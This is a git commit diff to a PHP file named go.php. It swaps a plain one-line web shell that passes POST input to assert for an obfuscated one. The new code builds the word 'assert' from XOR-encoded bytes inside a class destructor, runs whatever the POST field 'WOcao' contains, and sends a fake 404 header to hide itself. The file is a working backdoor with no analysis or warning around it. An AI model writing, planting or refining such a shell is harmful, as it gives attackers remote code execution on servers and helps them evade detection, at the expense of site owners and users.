e08b64cca261bcd80563927b61e0927909f0fe01
ncNius <31752914+ncNius@users.noreply.github.com>
2019-08-25 15:09:40 +0800

    Update go.php

--- go.php
+++ go.php
@@ -1,3 +1,18 @@
 <?php 
-forward_static_call_array(assert,array($_POST[x]));
+header('HTTP/1.1 404');
+class QSJA { 
+    public $c='';
+    function __destruct() {
+        $_0 = "\x46" ^ "\x27";
+        $_1 = "\xd5" ^ "\xa6";
+        $_2 = "\xf5" ^ "\x86";
+        $_3 = "\x2a" ^ "\x4f";
+        $_4 = "\xe7" ^ "\x95";
+        $_5 = "\xb9" ^ "\xcd";
+        $db =$_0.$_1.$_2.$_3.$_4.$_5;
+        return @$db($this->c);
+    }
+}
+$qsja = new QSJA();
+@$qsja->c = $_POST['WOcao'];
 ?>
